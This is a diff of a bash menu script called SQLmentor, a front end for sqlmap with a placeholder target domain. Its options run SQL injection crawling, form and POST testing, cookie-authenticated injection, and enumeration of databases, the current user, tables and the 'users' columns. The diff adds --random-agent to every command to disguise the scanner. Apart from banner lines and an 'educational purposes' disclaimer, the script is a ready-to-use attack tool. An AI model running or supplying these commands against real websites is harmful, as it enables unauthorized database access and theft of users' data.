@@ -1,21 +1,24 @@
 #!/bin/bash
 tput bold
+BANNER1="\033[31m"
+BANNER2="\033[1;32m"
+MENU="\033[0;33m"
 clear
 main() {
-echo -ne "
+echo -ne " ${BANNER2}
 Credit For SQLmap Goes To Its Developers, Not Me. I Just Created The Cheet Sheat
 ##############################################################################################
   ██████   █████   ██▓     ███▄ ▄███▓▓█████  ███▄    █ ▄▄▄█████▓ ▒█████   ██▀███  
 ▒██    ▒ ▒██▓  ██▒▓██▒    ▓██▒▀█▀ ██▒▓█   ▀  ██ ▀█   █ ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
-░ ▓██▄   ▒██▒  ██░▒██░    ▓██    ▓██░▒███   ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
+░ ▓██▄   ▒██▒  ██░▒██░    ▓██    ▓██░▒███   ${BANNER1}▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
   ▒   ██▒░██  █▀ ░▒██░    ▒██    ▒██ ▒▓█  ▄ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
-▒██████▒▒░▒███▒█▄ ░██████▒▒██▒   ░██▒░▒████▒▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒ @psycolulz
-▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
-░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░░  ░      ░ ░ ░  ░░ ░░   ░ ▒░    ░      ░ ▒ ▒░   ░▒ ░ ▒░  V. 1.0.3
+▒██████▒▒░▒███▒█▄ ░██████▒▒██▒   ░██▒░▒████▒▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒ ${BANNER2}@psycolulz
+${BANNER1}▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
+░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░░  ░      ░ ░ ░  ░░ ░░   ░ ▒░    ░      ░ ▒ ▒░   ░▒ ░ ▒░  V. 1.0.4
 ░  ░  ░     ░   ░   ░ ░   ░      ░      ░      ░   ░ ░   ░      ░ ░ ░ ▒    ░░   ░ 
       ░      ░        ░  ░       ░      ░  ░         ░              ░ ░     ░     
 ##############################################################################################                                                                          
- https://github.com/psycolulz
+${MENU} https://github.com/psycolulz
  This Tool Is For Educational Purposes! Shoutout To The SQLmap Developers"
 echo
 PS3='root@sqlmentor~:'
@@ -25,51 +28,51 @@ do
 case $opt in
 "SQL Crawling")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --crawl=2
+command sqlmap -u https://enterdomainhere.com/ --crawl=2 --random-agent
 ;;
 "SQL Crawling + Forms")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --forms --crawl=2
+command sqlmap -u https://enterdomainhere.com/ --forms --crawl=2 --random-agent
 ;;
 "SQL GET Req.")
 command clear
-command sqlmap -u https://enterdomainhere.com/
+command sqlmap -u https://enterdomainhere.com/ --random-agent
 ;;
 "SQL POST Req.")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val"
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" --random-agent
 ;;
 "SQL Auth Site")
 command clear
-command  sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --cookie="cookie1=val1;cookie2=val2"
+command  sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --cookie="cookie1=val1;cookie2=val2" --random-agent
 ;;
 "Collect DB & User")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --current-db --current-user
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --current-db --current-user --random-agent
 ;;
 "SQL & Tables")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --tables -D "testdb"
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --tables -D "testdb" --random-agent
 ;;
 "SQL User Columns")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --columns -T "users"
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" --columns -T "users" --random-agent
 ;;
 "SQL mssql DB")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mssql"
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mssql" --random-agent
 ;;
 "SQL mysql DB")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mysql"
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="mysql" --random-agent
 ;;
 "SQL oracle DB")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="oracle"
-;;
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="oracle" --random-agent
+;; 
 "SQL postgres DB")
 command clear
-command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="postgres"
+command sqlmap -u https://enterdomainhere.com/ --data="id=1&str=val" -p "id" -b --dbms="postgres" --random-agent
 ;;
 "Update Tool")
 command clear
@@ -101,5 +104,3 @@ echo "Press Ctrl + C"
 done
 }
 main
-
-
